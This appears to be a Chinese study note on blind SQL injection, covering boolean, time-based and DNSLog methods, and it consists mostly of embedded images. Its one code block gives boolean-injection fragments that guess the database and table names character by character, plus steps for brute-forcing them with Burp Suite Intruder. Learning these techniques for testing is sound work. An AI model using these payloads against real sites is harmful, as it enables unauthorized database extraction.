# 无显注入法--无法通过页面直接显示数据和错误信息
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01 布尔盲注
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理:
![](/assets/BCE183BF80E71F93B891EB4A4CD2AE3E.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: 配合Burpsuite快速匹配
![](/assets/C7CBE082C18855C847C61DA54025F7E3.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注入流程:
```sql
    判断语句末尾加上 %23
查库: and left((select database()),1)='s'
查表: and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='u'
利用 burpsute 将拦截的包发送到 intruder 模块，在 position 中选定参数(clear一下)，在payload中选择brute force进行猜解
根据攻击结果反馈开始添加第二个参数

```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 时间盲注
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理:
![](/assets/B435E9AB095D69230969F8256C149BB5.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: 配合Burpsuite快速匹配
![](/assets/60C5189C592E0E2494B4047CA306E7C1.png)
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 DNSLog盲注
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: 目标服务器是 windows server 才能用此方法
![](/assets/4BFF8119025B38FF4A8FAC2F09B0B1F2.png)





